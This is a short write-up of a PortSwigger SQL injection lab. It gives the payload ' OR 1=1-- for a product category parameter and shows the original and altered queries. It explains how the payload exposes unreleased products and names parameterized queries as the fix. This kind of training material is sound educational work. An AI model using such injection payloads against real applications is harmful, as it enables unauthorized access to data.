# retrieve-hidden-data

- **Source:** [PortSwigger](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
- **Level:** Apprentice
- **Vulnerability class:** SQL injection
- **Date:** 2026-11-23

## Goal
> To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

## Solution
I changed the `category` parameter in the URL to:
' OR 1=1--

The original query:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

After the payload:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

`OR 1=1` is always true, so all products are returned.
`--` turns the rest of the query into a comment, so `AND released = 1` is ignored and unreleased products are shown too.

## Root cause
User input is put directly into the SQL query instead of using a parameterized query.

## Fix
Use parameterized queries.

## What I learned
How to break out of a SQL query with `'` and use `--` to remove conditions from it.